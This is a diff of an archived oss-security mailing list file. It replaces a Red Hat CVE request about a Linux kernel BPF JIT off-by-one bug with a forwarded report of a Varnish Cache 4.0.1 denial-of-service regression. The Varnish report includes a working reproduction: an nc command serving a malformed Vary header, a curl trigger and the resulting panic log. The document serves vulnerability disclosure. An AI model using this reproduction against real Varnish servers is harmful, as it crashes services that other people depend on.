@@ -1,32 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/04/15/5
-Message-ID: <alpine.LFD.2.10.1404152345080.4513@javelin.pnq.redhat.com>
-Date: Tue, 15 Apr 2014 23:59:36 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-Subject: CVE request Linux kernel: arch: x86: net: bpf_jit: an off-by-one bug in x86_64 cond jump target
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/02/14
+Message-ID: <20140702234503.GA11203@openwall.com>
+Date: Thu, 3 Jul 2014 03:45:03 +0400
+From: Solar Designer <solar@...nwall.com>
+To: Marek Kroemeke <kroemeke@...il.com>
+Cc: oss-security@...ts.openwall.com, Poul-Henning Kamp <phk@....freebsd.dk>
+Subject: Re: Varnish - no CVE == bug regression
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+CC'ing the posting below to Poul-Henning Kamp.
 
-An off-by-one bug is found in the x86_64 cond jump target of the BPF JIT 
-filter code. In case a conditional jump is followed by a long jump, 
-conditional jump target is one byte past the start of target instruction.
-
-A user/program could use this flaw to crash the kernel resulting in DoS, or 
-potentially escalate user privileges on a system to gain root access.
-
-Upstream fix:
--------------
-   -> https://git.kernel.org/linus/a03ffcf873fe0f2565386ca8ef832144c42e67fa
-
-Introduced by:
---------------
-   -> https://git.kernel.org/linus/0a14842f5a3c0e88a1e59fac5c3025db39721f74
-
-
-Note: BPF JIT is disabled by default, must be enabled by the admin.
-
-Thank you.
---
-Prasad J Pandit / Red Hat Security Response Team
+On Wed, Jul 02, 2014 at 05:57:01PM +0100, Marek Kroemeke wrote:
+> Hi there,
+> 
+> 
+> Latest version of Varnish cache (4.0.1 https://www.varnish-cache.org/ ) has 
+> the same DoS vulnerability that 3.x had (which was subsequently fixed in 
+> that branch). 
+> 
+> 
+> Any chance to allocate some CVEs for the below so that this 
+> doesn't happen again ?
+> 
+> 
+> http://seclists.org/fulldisclosure/2013/Mar/55
+> http://seclists.org/fulldisclosure/2013/Mar/61
+> http://seclists.org/fulldisclosure/2013/Mar/63
+> http://seclists.org/fulldisclosure/2013/Mar/58
+> 
+> 
+> 
+> 
+> How to replicate (assuming varnish proxies to port 8100) :
+> 
+> 
+> "HTTP/1.1 200 foo\r\nVary: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n\r\n"  | nc.traditional -l -p8100
+> 
+> 
+> curl http://localhost:6081/
+> 
+> 
+> -- cut --
+> Jul  2 18:32:09 localhost varnishd[6145]: Child (21893) Panic message:#012Assert error in http_GetHdr(), cache/cache_http.c line 347:#012  Condition(l == strlen(hdr + 1)) not true.#012thread = (cache-worker)#012ident = Linux,3.2.0-58-generic,x86_64,-smalloc,-smalloc,-hcritbit,epoll#012Backtrace:#012  0x42fdd9: pan_ic+0x1a0#012  0x426267: http_GetHdr+0x5b#012  0x43a951: VRY_Create+0x375#012  0x41c930: vbf_beresp2obj+0x40#012  0x41e766: vbf_fetch_thread+0x1949#012  0x432b7d: Pool_Work_Thread+0x5e8#012  0x4444da: wrk_thread_real+0xfc#012  0x444698: WRK_thread+0x16#012  0x7f21da3cfe9a: /lib/x86_64-linux-gnu/libpthread.so.0(+0x7e9a) [0x7f21da3cfe9a]#012  0x7f21da0fc3fd: /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f21da0fc3fd]#012  busyobj = 0x7f21a4090a90 {#012    ws = 0x7f21a4090b50 {#012      id = "bo",#012      {s,f,r,e} = {0x7f21a4092a70,+456,(nil),+57376},#012    },#012  refcnt = 2#012  retries = 0#012  failed = 0#012  state = 1#012    is_do_stream#012    is_is_gunzip#012    bodystatus = 4 (eof),#012    },#012    http[bereq] = {#012      ws = 0x7f21a4090b50[bo]#012        "GET",#012        "/",#012        "HTTP/1.1",#012        "User-Agent: curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3",#012        "Host: localhost:6081",#012        "Accept: */*",#012        "X-Forwarded-For: 127.0.0.1",#012        "Accept-Encoding: gzip",#012        "X-Varnish: 3",#012    },#012    http[beresp] = {#012      ws = 0x7f21a4090b50[bo]#012        "HTTP/1.1",#012        "200",#012        "foo",#012        "Vary: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",#012        "Date: Wed, 02 Jul 2014 16:32:07 GMT",#012    },#012    ws = 0x7f21a4090cd8 { BAD_MAGIC(0x00000000) },#012    },#012  objcore (FETCH) = 0x7f2198000950 {#012    refcnt = 2#012    flags = 0x2#012    objhead = 0x7f21980009e0#012  }#012  }#012
+> -- cut --
+> 
+> 
+> 
+> 
+> regards,
+> AKAT-1
+> 22733db72ab3ed94b5f8a1ffcde850251fe6f466
+> Marek Kroemeke
